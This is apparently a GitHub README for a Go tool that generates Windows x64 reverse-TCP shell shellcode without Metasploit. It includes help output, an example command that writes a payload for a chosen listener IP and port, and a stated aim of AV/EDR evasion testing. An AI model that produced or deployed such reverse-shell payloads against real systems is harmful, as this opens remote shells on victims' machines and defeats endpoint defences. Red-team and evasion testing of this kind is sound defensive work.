# shell_reverse_tcp
msfvenom windows/x64/shell_reverse_tcp payload generator without dependencies

# Help

```
$ ./shell_reverse_tcp -h
Usage of ./shell_reverse_tcp:
  -f string
        Formats: {raw, hex, base64, c, rust, csharp, psh, vba} (default "raw")
  -l string
        LHOST IP address (default "127.0.0.1")
  -p int
        Port number (0-65535) (default 4444)
```

## Example

```
$ ./shell_reverse_tcp -l 192.168.1.2 -p 4444 -f raw > shellcode.bin
```

# Build

```bash
git clone https://github.com/nchgroup/shell_reverse_tcp
cd shell_reverse_tcp/
go build .
```

# Project spirit
Generate your payload in x64 quickly and easily without dependencies to perform AV/EDR evasion tests on Windows in amd64, so you can use encoders, ciphers, obfuscators, whatever.

# References
* https://vay3t.medium.com/malware-development-generando-shellcodes-de-metasploit-sin-metasploit-aa120ffcdd92
* https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/windows/x64/shell_bind_tcp.rb#L47
* https://github.com/vay3t/asm-shell_reverse_tcp

# Authors
* [Huerfano](https://www.linkedin.com/in/leonardo-astorga-20b1095a/)
* [Vay3t](https://vay3t.org)
